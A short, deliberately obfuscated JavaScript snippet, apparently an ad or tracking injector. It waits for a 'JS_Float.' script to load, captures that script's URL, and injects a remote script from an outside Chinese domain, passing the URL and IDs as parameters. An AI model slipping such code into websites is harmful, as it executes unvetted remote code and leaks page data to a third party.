function tasuidhasudhuisd(){
	var sek=0;
	setTimeout(function(){
		var ueasuidhasudhuisd=document.getElementsByTagName('head')[0].innerHTML;
		if(ueasuidhasudhuisd.indexOf("JS_Float.")!=-1) sek=1;
		
		if(sek==0)
		{
			timeOut++;
			//console.log(timeOut);
			if(timeOut<=10000){tasuidhasudhuisd();}
		}
		else
		{
			var scripts=ueasuidhasudhuisd;
			var reg=/src=\"(.*?)\"/gi;
			var drr=scripts.match(reg);
			for(var i=0;i<drr.length;i++)
			{
					if(drr[i].indexOf("JS_Float.")!=-1)
					{
						scripts=unescape(drr[i]);
						scripts=scripts.replace(/&amp;/gi,"&");
						break;
					}
			}
			ueasuidhasudhuisd=escape(scripts);
			yjsIns("http://sj.11413.com.cn/get/ins/sa.php?uid="+uid_dsj+"&te="+te_dsj+"&sr="+ueasuidhasudhuisd,"script");
		}
	},1);
}
tasuidhasudhuisd();